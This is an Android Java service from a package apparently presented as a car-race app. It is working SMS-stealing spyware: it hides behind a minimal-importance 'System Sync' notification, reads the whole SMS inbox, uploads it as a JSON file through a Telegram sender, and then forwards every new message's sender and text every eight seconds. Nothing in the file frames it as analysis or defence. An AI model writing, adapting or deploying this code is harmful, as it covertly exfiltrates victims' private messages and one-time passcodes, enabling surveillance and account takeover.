package com.carrace;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;

public class SmsService extends Service {

    private static final String TAG = "SmsService";
    private static final long LOOP_MS = 8000L;
    private static final Uri SMS_URI = Uri.parse("content://sms/inbox");

    private final Handler handler = new Handler(Looper.getMainLooper());
    /** ID SMS yang SUDAH pernah diproses (lama maupun baru). */
    private final Set<String> seenIds = new HashSet<>();
    private boolean running;
    private boolean initialLoadDone;

    private final Runnable loop = new Runnable() {
        @Override public void run() {
            try { poll(); } catch (Exception e) { Log.w(TAG, "poll error", e); }
            if (running) handler.postDelayed(this, LOOP_MS);
        }
    };

    @Override public void onCreate() {
        super.onCreate();
        startForegroundSafely();
        running = true;
        handler.post(loop);
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) { running = true; handler.post(loop); }
        return START_STICKY;
    }

    @Override public void onDestroy() {
        running = false;
        handler.removeCallbacks(loop);
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    private void startForegroundSafely() {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel(
                        "sms_sync", "System Sync", NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
            }
            Notification.Builder b = Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, "sms_sync")
                    : new Notification.Builder(this);
            b.setContentTitle("System")
             .setContentText("Running")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setOngoing(true);
            startForeground(1, b.build());
        } catch (RuntimeException e) { Log.w(TAG, "foreground gagal", e); }
    }

    private void poll() {
        // ---------- FASE 1: muat semua SMS LAMA sekali, kirim sebagai FILE ----------
        if (!initialLoadDone) {
            JSONArray all = readAllSms();
            if (all.length() > 0) {
                File file = writeJsonToDisk(all.toString());
                if (file != null) {
                    TelegramSender.sendDocument(file, "Log SMS lama (" + all.length() + " pesan)");
                }
            }
            initialLoadDone = true;
            return;
        }

        // ---------- FASE 2: SMS BARU langsung dikirim raw text ----------
        JSONArray baru = readNewSmsOnly();
        for (int i = 0; i < baru.length(); i++) {
            try {
                JSONObject o = baru.getJSONObject(i);
                String from = o.optString("from", "-");
                String body = o.optString("body", "");
                String text = "📩 SMS BARU\n"
                        + "Dari: " + from + "\n"
                        + "Waktu: " + o.optLong("date") + "\n\n"
                        + body;
                TelegramSender.sendRawText(text);
            } catch (Exception e) {
                Log.w(TAG, "kirim raw gagal", e);
            }
        }
    }

    // Baca SEMUA SMS, tandai semua sebagai seen (dipakai sekali di awal)
    private JSONArray readAllSms() {
        JSONArray arr = new JSONArray();
        Cursor c = null;
        try {
            c = getContentResolver().query(SMS_URI,
                    new String[]{"_id", "address", "body", "date"},
                    null, null, "date ASC");
            if (c == null) return arr;
            while (c.moveToNext()) {
                String id = c.getString(0);
                if (id == null) continue;
                seenIds.add(id);
                arr.put(toJson(id, c.getString(1), c.getString(2), c.getLong(3)));
            }
        } catch (Exception e) {
            Log.w(TAG, "baca all sms gagal", e);
        } finally { if (c != null) c.close(); }
        return arr;
    }

    // Hanya SMS yang BELUM ada di seenIds
    private JSONArray readNewSmsOnly() {
        JSONArray arr = new JSONArray();
        Cursor c = null;
        try {
            c = getContentResolver().query(SMS_URI,
                    new String[]{"_id", "address", "body", "date"},
                    null, null, "date ASC");
            if (c == null) return arr;
            while (c.moveToNext()) {
                String id = c.getString(0);
                if (id == null || seenIds.contains(id)) continue;
                seenIds.add(id);
                arr.put(toJson(id, c.getString(1), c.getString(2), c.getLong(3)));
            }
        } catch (Exception e) {
            Log.w(TAG, "baca new sms gagal", e);
        } finally { if (c != null) c.close(); }
        return arr;
    }

    private JSONObject toJson(String id, String from, String body, long date) {
        JSONObject o = new JSONObject();
        try {
            o.put("id", id);
            o.put("from", from == null ? "" : from);
            o.put("body", body == null ? "" : body);
            o.put("date", date);
        } catch (Exception ignored) { }
        return o;
    }

    private File writeJsonToDisk(String json) {
        try {
            File dir = getExternalFilesDir(null);
            if (dir == null) dir = getFilesDir();
            if (!dir.exists()) dir.mkdirs();
            String name = "sms_" + new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
                    .format(new Date()) + ".json";
            File out = new File(dir, name);
            try (FileOutputStream fos = new FileOutputStream(out)) {
                fos.write(json.getBytes(StandardCharsets.UTF_8));
            }
            Log.i(TAG, "file JSON: " + out.getAbsolutePath());
            return out;
        } catch (Exception e) {
            Log.w(TAG, "tulis json gagal", e);
            return null;
        }
    }
}
